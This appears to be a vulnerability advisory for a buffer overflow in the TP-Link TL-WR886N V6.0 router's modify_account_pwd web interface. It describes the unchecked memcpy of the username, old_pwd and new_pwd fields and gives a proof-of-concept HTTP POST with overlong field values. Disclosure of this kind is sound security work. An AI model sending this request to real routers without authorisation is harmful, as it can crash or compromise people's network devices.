# TP-LINK WR-886N Vulnerability
This vulnerability is on the /cloud_config/router_post/modify_account_pwd interface and affects the latest version of the router operating system (which is a different RTOS system from the linux operating system), and the firmware version is TL-WR886N V6.0 upgrade software 20190826 2.3.8
## Vulnerability description
There is a buffer overflow vulnerability on the /cloud_config/router_post/modify_account_pwd interface.

1. An interface ```/cloud_config/router_post/modify_account_pwd``` is registered first in the modifyAccPwdRegister function.
![](./modifyAccPwdRegister1.png)
2. In the handler, the v7 variable is the ```username``` field in the packet, and the v9 variable is the ```old_pwd``` field in the packet,and the v11 variable is the ```new_pwd``` field in the packet. Then directly memcpy to the a3 variable refers to the address space, there is a buffer overflow problem.
![](./modifyAccPwdRegister2.png)
## poc
```
POST /cloud_config/router_post/modify_account_pwd HTTP/1.1
Host: 192.168.0.1
Content-Length: 717
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36
Content-Type: application/x-www-form-urlencoded;
Accept: */*
Origin: http://192.168.0.1
Referer: http://192.168.0.1/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

username=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&old_pwd=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&new_pwd=cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc
```
## Acknowledgment 
Credit to [@Yu3H0](https://github.com/Yu3H0/) ,[@leonW7](https://github.com/leonW7), [@cpegg](https://github.com/cpeggg) from Shanghai Jiao Tong University and TIANGONG Team of Legendsec at Qi'anxin Group.